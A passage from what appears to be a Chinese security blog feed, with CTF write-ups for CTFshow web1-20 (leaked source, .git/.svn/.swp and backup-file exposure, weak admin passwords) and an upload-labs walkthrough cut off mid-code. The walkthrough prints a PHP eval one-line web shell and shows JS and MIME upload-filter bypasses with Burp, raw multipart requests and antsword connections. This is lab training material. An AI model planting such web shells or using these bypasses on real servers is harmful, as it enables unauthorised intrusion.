            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web1-20信息收集篇</title>
      <link href="/2023/03/13/web1-20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/"/>
      <url>/2023/03/13/web1-20%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h1><blockquote><p>开发注释未及时删除</p></blockquote><p>直接f12源代码内存在flag</p><h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><blockquote><p>js前台拦截 === 无效操作</p></blockquote><p>虽然禁止了右键和f12来打开开发者模式，但是chrome可以在更多工具中找到开发工具并打开。flag在源代码中。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677482893019-176e18a5-68f2-4408-8e72-8fbdacff4286.png" alt="image.png"></p><h2 id="others"><a href="#others" class="headerlink" title="others"></a>others</h2><p>看了wp之后发现还有几种方法：</p><ul><li>在url前面加上<code>view-source:</code></li><li>下载源码</li><li>在很短的时间内按f5和f12</li><li><code>ctrl + U</code>查看源代码</li><li>打开一个空白网页，然后按F12，接着再把网址复制进去并回车</li></ul><h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><blockquote><p>没思路的时候抓个包看看，可能会有意外收获</p></blockquote><p>直接burpsuite抓包，返回包中在请求头中存在flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677483548818-27ec80b1-54a1-4dab-846c-caaf3559d6d1.png" alt="image.png"></p><h1 id="web4"><a href="#web4" class="headerlink" title="web4"></a>web4</h1><blockquote><p>总有人把后台地址写入robots，帮黑阔大佬们引路。</p></blockquote><p>提示的已经很明显了，访问对应的反爬robots页面：<code>/robots.txt</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677483894393-32a3362c-c5f6-4237-b686-ce72a15d9d05.png" alt="image.png"><br>再次访问对应页面，得到flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677483939660-670394f2-b08d-4c8c-b197-afd1b1cc11f3.png" alt="image.png"></p><h1 id="web5"><a href="#web5" class="headerlink" title="web5"></a>web5</h1><blockquote><p>phps源码泄露有时候能帮上忙</p></blockquote><p>根据提示，这道题估计需要扫备份文件了。因此尝试去扫，但是换了好几个软件都没有扫到，看了wp，发现是：<code>index.phps</code>文件。<br>访问对应地址下载文件，可以看到flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677487363497-cfbb986a-e286-47d7-8034-1a70668ca14b.png" alt="image.png"></p><h1 id="web6"><a href="#web6" class="headerlink" title="web6"></a>web6</h1><blockquote><p>解压源码到当前目录，测试正常，收工</p></blockquote><p>一眼丁真，还是扫，继续扫。这个的目标文件是<code>www.zip</code>扫出来再解压打开即可。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677487513876-637eeffe-876d-4fa7-bfa7-171b5c25a78a.png" alt="image.png"></p><h1 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h1><blockquote><p>版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>根据提示可以判断出是git泄露的题目（扫也可以），直接访问git中的<code>index.php</code>文件，访问地址：<br><code>url/.git/index.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677487895563-63a6899d-9a87-46a6-9376-d5610eed2ea8.png" alt="image.png"></p><h1 id="web8"><a href="#web8" class="headerlink" title="web8"></a>web8</h1><blockquote><p>版本控制很重要，但不要部署到生产环境更重要。</p></blockquote><p>除了git版本控制之外，这道题使用了svn控制版本。disreach扫描，发现有<code>.svn</code>泄露。因此我们直接访问：<code>url/.svn</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677488199030-63ba484d-0295-43c6-ae30-881cdee6af47.png" alt="image.png"></p><h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><blockquote><p>发现网页有个错别字？赶紧在生产环境vim改下，不好，死机了</p></blockquote><p>考察的是vim缓存泄露，即类似windows上编辑word文件，linux在vim编辑文件时也会产生缓存文件，如果像题目一样意外退出则会保存缓存文件。<br>以index.php来说，第一次退出后，缓存文件名为 .index.php.swp，第二次退出后，缓存文件名为.index.php.swo,第三次退出后文件名为.index.php.swn。<br>因此直接访问<code>url/index.php.swp</code>即可获取到文件。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677488692685-e9c7a051-b68e-4f1d-8382-f1083fbfc606.png" alt="image.png"></p><h2 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h2><p>linux文件前面这个点指的是隐藏文件的意思，可能不需要加点也可以访问。</p><h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><blockquote><p>cookie 只是一块饼干，不能存放任何隐私数据</p></blockquote><p>根据题目，可以猜想可能是cookie里面藏东西了，因此尝试f12-网络监测：<br>在回传包中发现：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677489361977-d6445a0a-9884-4913-8885-8c470b582a18.png" alt="image.png"></p><h1 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h1><blockquote><p>域名其实也可以隐藏信息，比如flag.ctfshow.com 就隐藏了一条信息、</p></blockquote><h1 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h1><blockquote><p>有时候网站上的公开信息，就是管理员常用密码</p></blockquote><p>访问网站，访问<code>robots.txt</code>。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659086016-6482b784-18cc-4bd5-becd-347016c50a89.png" alt="image.png"><br>访问地址，发现需要账号密码，根据提示，猜想账号admin，密码为对网页末尾电话。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659155796-072b792a-f76d-449f-8574-15e07c5d1825.png" alt="image.png"><br>成功登录获取到flag。</p><h1 id="web13"><a href="#web13" class="headerlink" title="web13"></a>web13</h1><blockquote><p>技术文档里面不要出现敏感信息，部署到生产环境后及时修改默认密码</p></blockquote><p>根据提示，可以在主页中最底部发现有<code>document</code>，下载文档。文档中即有登录账号密码：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659750747-db64cb0e-fc5a-4cb4-bc94-4d6fffe1071f.png" alt="image.png"><br>登录对应地址，并输入对应账号密码，获得flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677659800472-5c848c58-2560-4e62-867c-48ecbc15cc4d.png" alt="image.png"></p><h1 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h1><blockquote><p>有时候源码里面就能不经意间泄露重要(editor)的信息,默认配置害死人</p></blockquote><p>查看源码源码中上传图片的位置暴露了比编辑器地址：<code>/editor</code>（当然也可以扫描出来）<br>然后根据提示，在插入文件中选择文件空间。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661001765-ed170db3-ec48-48ff-8e84-fa8e456d352d.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661012463-5891556a-d14c-40b1-abc5-11107aa67e4f.png" alt="image.png"><br>经过搜索，发现如下地址：<code>/editor/attached/file/var/www/html/nothinghere/fl000g.txt</code><br>前面是网站根目录，直接访问：<code>nothinghere/fl000g.txt</code>得到flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661160331-f88eb97f-1984-4d6f-af3a-fe7680e70d73.png" alt="image.png"></p><h1 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h1><blockquote><p>公开的信息比如邮箱，可能造成信息泄露，产生严重后果</p></blockquote><p>经过扫描发现存在<code>/admin</code>访问。内有一个登陆系统，系统存在忘记密码找回，发现密保问题为居住地址。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677661547444-07d88c82-2efe-47b1-af59-eb3a41fcf40c.png" alt="image.png"><br>可以根据about关于界面最下方的电话号查询所属地。但是查询了发现电话不存在。发现主页有qq邮箱，用qq查询：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662044749-a963e17b-36fb-406e-aca0-50e68524087f.png" alt="image.png"><br>输入后重置密码，登录获取到flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662272962-b2d18581-e88b-4f85-8830-7ee5dc25dd01.png" alt="image.png"></p><h1 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h1><blockquote><p>对于测试用的探针，使用完毕后要及时删除，可能会造成信息泄露</p></blockquote><p>根据提示，我们可以了解到这道题用到了探针，访问：<code>tz.php</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662498104-ab17d3fd-d09e-4d37-bdb8-c279c78be35d.png" alt="image.png"><br>我们可以在php相关参数一栏中查看到<code>phpinfo()</code>，在页面中搜索flag，发现在环境中有flag字段：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677662734509-e50900a3-d143-43b1-858e-e1d83fbbae0c.png" alt="image.png"></p><h1 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h1><blockquote><p>备份的sql文件会泄露敏感信息</p></blockquote><p>扫，发现它的备份名称为：<code>backup.sql</code>，下载对应包，可以看到文件内有flag：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663254137-edde1c49-2d30-4625-b7c7-596ad117da73.png" alt="image.png"></p><h1 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h1><blockquote><p>不要着急，休息，休息一会儿，玩101分给你flag</p></blockquote><p>游戏题，直接查看源代码，查看<code>Flappy_js.js</code>文件<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663432915-94befbb5-3da7-4037-9c98-dc3add8ab8d7.png" alt="image.png"><br>发现里面有对分数判断：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663480194-bc8f1dc4-7e5e-4e9a-9229-a2d5c2b7ae4e.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663488999-1aeb987f-2d46-4d08-addd-57bc00045cf7.png" alt="image.png"><br>根据结果访问对应<code>110.php</code>获得flag<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663518588-a91f1d72-0f50-4610-80ec-6e350e3f0e9d.png" alt="image.png"></p><h1 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h1><blockquote><p>密钥什么的，就不要放在前端了</p></blockquote><p>f12查看源代码，发现php代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line"><span class="variable">$u</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable">$p</span> ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接根据提示post传入账号密码即可：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677663807340-ae78657e-3980-404f-af6d-9b57d1a4b7c7.png" alt="image.png"></p><h1 id="web20"><a href="#web20" class="headerlink" title="web20"></a>web20</h1><blockquote><p>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤了。</p></blockquote><p>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb 下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag flag{ctfshow_old_database}<br>虽然内容乱码了，但是可以直接搜索flag字段来找到flag。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1677664080200-59170fc9-2d27-41ea-9514-447d48d68017.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>uploads-lab之旅</title>
      <link href="/2023/03/12/uploads-lab%E4%B9%8B%E6%97%85/"/>
      <url>/2023/03/12/uploads-lab%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<p>准备材料：</p><ul><li>phpstudy：<a href="https://www.xp.cn/download.html">https://www.xp.cn/download.html</a></li><li>uploads-lab：<a href="https://gitcode.net/mirrors/tj1ngwe1/upload-labs?utm_source=csdn_github_accelerator">https://gitcode.net/mirrors/tj1ngwe1/upload-labs?utm_source=csdn_github_accelerator</a></li></ul><h4 id="uploads-lab的搭建"><a href="#uploads-lab的搭建" class="headerlink" title="uploads-lab的搭建"></a>uploads-lab的搭建</h4><p>uploads-lab下载为zip文件，并解压在phpstudy下的www文件夹内，注意将文件夹重命名为uploads-lab。<br>解压成功后访问 <a href="http://127.0.0.1/upload-labs">http://127.0.0.1/upload-labs</a> 打开即可(PS:部分人burpsuite可能使用本机地址无法抓包，建议127.0.0.1修改为本机地址！)<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673542456881-755e93e5-08db-4264-893b-3434505bba58.png" alt="image.png"></p><h1 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h1><p>任务：上传一个<code>webshell</code>到服务器。<br>首先先尝试直接传一个一句话木马<code>webshell.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">eval</span>(_POST[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上传失败，提示：该文件不允许上传，请上传.jpg|.png|.gif类型的文件,当前文件类型为：.php<br>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> file = document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">    <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">    <span class="comment">//提取上传文件的类型</span></span><br><span class="line">    <span class="keyword">var</span> ext_name = file.<span class="title function_ invoke__">substring</span>(file.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">    <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">    <span class="keyword">if</span> (allow_ext.<span class="title function_ invoke__">indexOf</span>(ext_name + <span class="string">&quot;|&quot;</span>) == -<span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">        <span class="title function_ invoke__">alert</span>(errMsg);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>f12查看源代码，发现把函数放在了前端<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673544303968-26e4e437-558e-4377-b9cb-d552fc971cc2.png" alt="image.png"></p><h2 id="方法一-禁用js"><a href="#方法一-禁用js" class="headerlink" title="方法一 禁用js"></a>方法一 禁用js</h2><p>直接浏览器禁用js<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673545764014-6f3370b8-3730-4849-8d0e-57c5a2741143.png" alt="image.png"><br>上传成功，用antsword测试连接，成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673546203765-a912ec10-9c39-4ed9-a479-d91042847e7f.png" alt="b4797b0734fbfd3618d946ec7938912.png"></p><h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>修改文件后缀名为<code>webshell.png</code>上传，打开burpsuite抓包：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673546459582-bb57208f-a5e1-4b13-aec7-00f92787e614.png" alt="image.png"><br>将filename参数修改文件后缀<code>.php</code><br>用antsword测试连接，成功</p><h2 id="方法三（重要）"><a href="#方法三（重要）" class="headerlink" title="方法三（重要）"></a>方法三（重要）</h2><p>右键页面-查看网站源代码-全部复制下来-保存为html后缀文件，找到文件中的js代码，删除。删除代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> file = document.<span class="title function_ invoke__">getElementsByName</span>(<span class="string">&#x27;upload_file&#x27;</span>)[<span class="number">0</span>].value;</span><br><span class="line">        <span class="keyword">if</span> (file == <span class="literal">null</span> || file == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">alert</span>(<span class="string">&quot;请选择要上传的文件!&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//定义允许上传的文件类型</span></span><br><span class="line">        <span class="keyword">var</span> allow_ext = <span class="string">&quot;.jpg|.png|.gif&quot;</span>;</span><br><span class="line">        <span class="comment">//提取上传文件的类型</span></span><br><span class="line">        <span class="keyword">var</span> ext_name = file.<span class="title function_ invoke__">substring</span>(file.<span class="title function_ invoke__">lastIndexOf</span>(<span class="string">&quot;.&quot;</span>));</span><br><span class="line">        <span class="comment">//判断上传文件类型是否允许上传</span></span><br><span class="line">        <span class="keyword">if</span> (allow_ext.<span class="title function_ invoke__">indexOf</span>(ext_name) == -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">var</span> errMsg = <span class="string">&quot;该文件不允许上传，请上传&quot;</span> + allow_ext + <span class="string">&quot;类型的文件,当前文件类型为：&quot;</span> + ext_name;</span><br><span class="line">            <span class="title function_ invoke__">alert</span>(errMsg);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这时我们运行这个HTML文件，UI仍然会显示，但是由于我们已经删除了js函数，所以我们不知道要将文件传到哪里。<br>我们回到原网页，右键页面-检查-网络，上传文件，看到上传的图片的请求网址。（这一步用burpsuite也可以）<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673609137323-2d967bd6-143f-41ce-b1da-dc95476ccd17.png" alt="7c0ae6a5a632a3866408524ad8e7a72.png"><br>知道请求网址了就可以给html文件添加action了，action是告诉他这个图片提交给谁，因为这个源代码中没有，我们就自己加一个。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673609254796-cf64222b-d921-4e97-93cf-19ce4510b673.png" alt="7c0ae6a5a632a3866408524ad8e7a72.png"><br>添加好之后重新运行html文件，再上传<code>webshell.php</code>文件，直接就可以上传成功。</p><h1 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h1><p>要求：上传一个<code>webshell</code>到服务器。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//判断是否上传submit参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="comment">//检查文件或目录是否存在</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="comment">//允许传输 .jpg/.png/.gif 后缀文件</span></span><br><span class="line">        <span class="keyword">if</span> ((<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/jpeg&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/gif&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">//将上传的文件移动到新位置</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span> . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;文件类型不正确，请重新上传！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span>.<span class="string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h2><p>这一关是常见验证中的文件类型验证，也就是验证MIME信息，将<code>webshell.php</code>改为<code>webshell.png</code>，并上传，在burp抓包处修改文件名为<code>webshell.php</code>，即可上传成功，antsword连接测试成功。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1673605350606-8477e614-1e6f-42f6-83e0-611ea73de702.png" alt="image.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">------WebKitFormBoundary09G9BBRK49OTlzSH</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;webshell.png&quot;</span><span class="comment">//将这里修改为webshell.php</span></span><br><span class="line">Content-Type: image/png</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>或者直接上传<code>webshell.php</code>文件，因为检测的是<code>Content-Type</code>参数，所以直接将其修改为<code>image/jpeg</code>、<code>image/png</code>、<code>image/gif</code>三种之一即可。</p><h1 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$is_upload</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$msg</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">//定义submit参数</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$UPLOAD_ADDR</span>)) &#123;</span><br><span class="line">        <span class="variable">$deny_ext</span> = <span class="keyword">array</span>(<span class="string">&#x27;.asp&#x27;</span>,<span class="string">&#x27;.aspx&#x27;</span>,<span class="string">&#x27;.php&#x27;</span>,<span class="string">&#x27;.jsp&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">deldot</span>(<span class="variable">$file_name</span>);<span class="comment">//删除文件名末尾的点</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strrchr</span>(<span class="variable">$file_name</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$file_ext</span>); <span class="comment">//转换为小写</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">str_ireplace</span>(<span class="string">&#x27;::$DATA&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$file_ext</span>);<span class="comment">//去除字符串::$DATA</span></span><br><span class="line">        <span class="variable">$file_ext</span> = <span class="title function_ invoke__">trim</span>(<span class="variable">$file_ext</span>); <span class="comment">//收尾去空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$file_ext</span>, <span class="variable">$deny_ext</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>], <span class="variable">$UPLOAD_ADDR</span>. <span class="string">&#x27;/&#x27;</span> . <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">                 <span class="variable">$img_path</span> = <span class="variable">$UPLOAD_ADDR</span> .<span class="string">&#x27;/&#x27;</span>. <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">                 <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;不允许上传.asp,.aspx,.php,.jsp后缀文件！&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$msg</span> = <span class="variable">$UPLOAD_ADDR</span> . <span 